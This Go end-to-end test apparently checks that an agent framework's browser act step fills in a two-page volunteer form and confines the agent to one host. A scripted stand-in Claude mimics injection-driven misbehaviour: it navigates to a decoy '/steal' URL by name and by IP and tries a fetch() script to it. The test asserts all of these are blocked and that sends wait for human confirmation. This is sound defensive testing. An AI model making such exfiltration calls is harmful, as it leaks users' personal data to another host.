package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"testing"
	"time"

	"go.temporal.io/sdk/testsuite"

	"github.com/heedle-ai/draft"
	"github.com/heedle-ai/loom"
	"github.com/heedle-ai/pirn"
	"github.com/heedle-ai/reed"
	"github.com/heedle-ai/warp"
)

// TestE2EAct_FillsAForm is ci:e2e-act (roadmap 9.5): an act step, as
// heedle compiles and loom runs it, fills in a two-page form served by
// the test itself, in the browser-agent image (heedle's pinned one, or
// HEEDLE_E2E_ACT_IMAGE), with a stand-in Claude that also tries what a
// page might talk it into: leaving for another host by name and by
// address, and running a script. The form's server receives exactly what
// was typed and chosen; the other host receives nothing; the record has
// every action, a screenshot after each that changes the page, and that
// it finished; no act container is left. Linux only: it needs Podman.
func TestE2EAct_FillsAForm(t *testing.T) {
	if os.Getenv("HEEDLE_E2E_ACT") != "1" {
		t.Skip("set HEEDLE_E2E_ACT=1 to fill in a form with the browser-agent image")
	}
	img := os.Getenv("HEEDLE_E2E_ACT_IMAGE")
	if img == "" {
		img = pinned.BrowserAgent
		if exec.Command("podman", "image", "exists", img).Run() != nil {
			podman(t, "pull", "--quiet", img)
		}
	}
	network, decoyIP, got, hits := actSites(t)

	program := `(act "Put Ada Lovelace (ada@example.org) on the volunteer list for Saturday." "http://forms-srv:8080/volunteer")`
	var compiled strings.Builder
	if err := run(ctx, []string{"compile", program}, &compiled); err != nil || !strings.Contains(compiled.String(), `"Act"`) {
		t.Fatalf("heedle compile: %v\n%s", err, compiled.String())
	}
	claude := standInClaude(t, decoyIP)
	var asked []pirn.ActPending
	act := pirn.Act{Claude: pirn.Claude{APIKey: "stand-in", BaseURL: claude.URL},
		Browser: pirn.ReedBrowser{Browser: reed.Browser{Image: img, Network: network}}, Image: img,
		Confirm: func(_ context.Context, p pirn.ActPending) (bool, error) { asked = append(asked, p); return true, nil }}
	reg := draft.DefaultRegistry()
	var suite testsuite.WorkflowTestSuite
	env := suite.NewTestWorkflowEnvironment()
	env.SetTestTimeout(pirn.ActBudget + 5*time.Minute)
	if err := pirn.RegisterAct(reg, env, act); err != nil {
		t.Fatal(err)
	}
	store, err := warp.Init(ctx, filepath.Join(t.TempDir(), "store.git"))
	if err != nil {
		t.Fatal(err)
	}
	loom.Register(env, store, reg)
	p, err := loom.Compile(ctx, reg, program)
	if err != nil {
		t.Fatal(err)
	}
	env.ExecuteWorkflow(loom.RunWorkflowName, loom.RunInput{Program: program, Plan: p, Ref: loom.DefaultRef})
	if err := env.GetWorkflowError(); err != nil {
		t.Fatalf("the run failed: %v", err)
	}
	var res loom.RunResult
	if err := env.GetWorkflowResult(&res); err != nil {
		t.Fatal(err)
	}
	rec, ok := pirn.ParseAct(res.Outputs["n0"])
	if !ok {
		t.Fatalf("the output isn't an act record:\n%s", res.Outputs["n0"])
	}

	// What arrived, and what didn't.
	if g := got(); g != "email=ada%40example.org&name=Ada+Lovelace\nshift=Saturday" {
		t.Errorf("the form's server got %q", g)
	}
	time.Sleep(time.Second) // let any stray request arrive
	if n := hits(); n != 0 {
		t.Errorf("the other host received %d requests", n)
	}
	// The record.
	var tools []string
	shots := 0
	for _, c := range rec.Calls {
		tools = append(tools, c.Tool)
		if c.Shot != "" {
			shots++
		}
	}
	want := "browser_navigate browser_snapshot browser_fill_form confirm browser_click browser_snapshot browser_select_option confirm browser_click browser_navigate browser_navigate browser_evaluate"
	if strings.Join(tools, " ") != want {
		t.Errorf("actions %q, want %q", tools, want)
	}
	if rec.Ended != pirn.EndedFinished || strings.Join(rec.Allowed, " ") != "forms-srv" || shots < 5 || rec.Calls[11].Output != "No such tool." ||
		!rec.Calls[9].IsError || !rec.Calls[10].IsError || rec.BlockedTotal == 0 || !strings.Contains(strings.Join(rec.Blocked, " "), "decoy-srv") {
		t.Errorf("record: ended %s, allowed %v, %d screenshots, blocked %d %v, last calls %+v", rec.Ended, rec.Allowed, shots, rec.BlockedTotal, rec.Blocked, rec.Calls[7:])
	}
	// Leaving by navigation is refused before it reaches the browser
	// (review 39); what the page itself asked for reached nothing, and the
	// record lists it, from the first page too.
	if !strings.HasPrefix(rec.Calls[9].Output, "Not run: this step may only open") || !strings.HasPrefix(rec.Calls[10].Output, "Not run: this step may only open") {
		t.Errorf("navigations away: %q, %q", rec.Calls[9].Output, rec.Calls[10].Output)
	}
	if blocked := strings.Join(rec.Blocked, " "); !strings.Contains(blocked, "/pixel.png") || rec.BlockedUnknown {
		t.Errorf("blocked: %v (unknown %v)", rec.Blocked, rec.BlockedUnknown)
	}
	// Each page that sent asked first, with Claude's summary (roadmap 9.7).
	if len(asked) != 2 || asked[0].Summary != "Ada Lovelace, ada@example.org, Saturday." || rec.HeldTotal != 0 {
		t.Errorf("asked %+v, held %d", asked, rec.HeldTotal)
	}
	if rec.URL != "http://forms-srv:8080/volunteer/done" {
		t.Errorf("the last page: %q", rec.URL)
	}
	if !strings.Contains(rec.Text, "Saturday") {
		t.Errorf("the answer: %q", rec.Text)
	}
	// The session's container is gone.
	if left := podman(t, "ps", "-a", "--filter", "label="+reed.ActLabel, "--format", "{{.Names}}"); left != "" {
		t.Errorf("act containers left: %s", left)
	}
}

func podman(t *testing.T, args ...string) string {
	t.Helper()
	out, err := exec.Command("podman", args...).CombinedOutput()
	if err != nil {
		t.Fatalf("podman %s: %v\n%s", strings.Join(args, " "), err, out)
	}
	return strings.TrimSpace(string(out))
}

// actSites starts the form and the other host (testdata/actform) on a
// fresh network, and returns it, the other host's address on it, and what
// the form received and how many requests the other host did, read from
// ports published on 127.0.0.1.
func actSites(t *testing.T) (network, decoyIP string, got func() string, hits func() int) {
	t.Helper()
	dir := t.TempDir()
	build := exec.Command("go", "build", "-o", filepath.Join(dir, "actform"), "./testdata/actform")
	build.Env = append(os.Environ(), "CGO_ENABLED=0")
	if out, err := build.CombinedOutput(); err != nil {
		t.Fatalf("build actform: %v\n%s", err, out)
	}
	os.WriteFile(filepath.Join(dir, "Containerfile"), []byte("FROM scratch\nCOPY actform /actform\nENTRYPOINT [\"/actform\"]\n"), 0o644)
	img := podman(t, "build", "--quiet", dir)
	network = fmt.Sprintf("heedle-act-%d", time.Now().UnixNano())
	podman(t, "network", "create", network)
	t.Cleanup(func() {
		exec.Command("podman", "rm", "-f", "-t", "0", network+"-form", network+"-decoy").Run()
		exec.Command("podman", "network", "rm", "-f", network).Run()
	})
	podman(t, "run", "-d", "--rm", "--name", network+"-form", "--network", network, "--network-alias", "forms-srv", "--publish", "127.0.0.1::8080", img, "form")
	podman(t, "run", "-d", "--rm", "--name", network+"-decoy", "--network", network, "--network-alias", "decoy-srv", "--publish", "127.0.0.1::8080", img, "decoy")
	decoyIP = podman(t, "inspect", "--format", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", network+"-decoy")
	client := &http.Client{Transport: &http.Transport{Proxy: nil}}
	get := func(name, path string) string {
		addr := strings.Split(podman(t, "port", name, "8080/tcp"), "\n")[0]
		for i := 0; i < 50; i++ {
			if res, err := client.Get("http://" + addr + path); err == nil {
				b, _ := io.ReadAll(res.Body)
				res.Body.Close()
				return string(b)
			}
			time.Sleep(100 * time.Millisecond)
		}
		t.Fatalf("%s unreachable", name)
		return ""
	}
	got = func() string { return get(network+"-form", "/got") }
	hits = func() int {
		var n int
		fmt.Sscan(get(network+"-decoy", "/hits"), &n)
		return n
	}
	got()
	hits()
	return network, decoyIP, got, hits
}

// standInClaude is a Messages API that works the form as Claude would,
// reading each element's ref from the latest page snapshot it was given,
// then does what a hostile page might talk a model into: it navigates to
// the other host by name and by address and asks for a script tool,
// before saying it's done.
func standInClaude(t *testing.T, decoyIP string) *httptest.Server {
	var mu sync.Mutex
	n := 0
	refOf := func(snaps []string, role string) string {
		re := regexp.MustCompile(regexp.QuoteMeta(role) + `[^\n]*\[ref=([a-z0-9]+)\]`)
		for i := len(snaps) - 1; i >= 0; i-- {
			if m := re.FindStringSubmatch(snaps[i]); m != nil {
				return m[1]
			}
		}
		t.Errorf("no %s in the snapshots", role)
		return "e0"
	}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var req struct {
			Messages []struct {
				Content []map[string]any `json:"content"`
			} `json:"messages"`
		}
		json.NewDecoder(r.Body).Decode(&req)
		var snaps []string
		for _, m := range req.Messages {
			for _, c := range m.Content {
				if c["type"] == "tool_result" {
					snaps = append(snaps, texts(c["content"]))
				}
			}
		}
		mu.Lock()
		n++
		step := n
		mu.Unlock()
		use := func(tool string, input any) string {
			b, _ := json.Marshal(input)
			return fmt.Sprintf(`{"type":"tool_use","id":"t%d","name":"browser__%s","input":%s}`, step, tool, b)
		}
		var block, stop string = "", "tool_use"
		switch step {
		case 1:
			block = use("browser_navigate", map[string]any{"url": "http://forms-srv:8080/volunteer"})
		case 2, 6:
			block = use("browser_snapshot", map[string]any{})
		case 3:
			block = use("browser_fill_form", map[string]any{"fields": []map[string]any{
				{"name": "Name", "type": "textbox", "target": refOf(snaps, `textbox "Name"`), "value": "Ada Lovelace"},
				{"name": "Email", "type": "textbox", "target": refOf(snaps, `textbox "Email"`), "value": "ada@example.org"},
			}})
		case 4, 8: // each page that sends waits for a person (roadmap 9.7)
			block = fmt.Sprintf(`{"type":"tool_use","id":"t%d","name":"confirm","input":{"summary":"Ada Lovelace, ada@example.org, Saturday."}}`, step)
		case 5:
			block = use("browser_click", map[string]any{"element": "Next", "target": refOf(snaps, `button "Next"`)})
		case 7:
			block = use("browser_select_option", map[string]any{"element": "Shift", "target": refOf(snaps, `combobox "Shift"`), "values": []string{"Saturday"}})
		case 9:
			block = use("browser_click", map[string]any{"element": "Submit", "target": refOf(snaps, `button "Submit"`)})
		case 10:
			block = use("browser_navigate", map[string]any{"url": "http://decoy-srv:8080/steal?name=Ada"})
		case 11:
			block = use("browser_navigate", map[string]any{"url": "http://" + decoyIP + ":8080/steal?name=Ada"})
		case 12:
			block = use("browser_evaluate", map[string]any{"function": "() => fetch('http://decoy-srv:8080/steal')"})
		default:
			block, stop = `{"type":"text","text":"Ada Lovelace is on the volunteer list for Saturday.\nResult: finished"}`, "end_turn"
		}
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"id":"m%d","type":"message","role":"assistant","model":"claude-sonnet-5-5","stop_reason":%q,"usage":{"input_tokens":10,"output_tokens":5},"content":[%s]}`, step, stop, block)
	}))
	t.Cleanup(srv.Close)
	return srv
}

// texts is every text in a tool result's content, joined.
func texts(v any) string {
	switch x := v.(type) {
	case string:
		return x
	case []any:
		var b strings.Builder
		for _, e := range x {
			b.WriteString(texts(e))
			b.WriteString("\n")
		}
		return b.String()
	case map[string]any:
		return texts(x["text"])
	}
	return ""
}
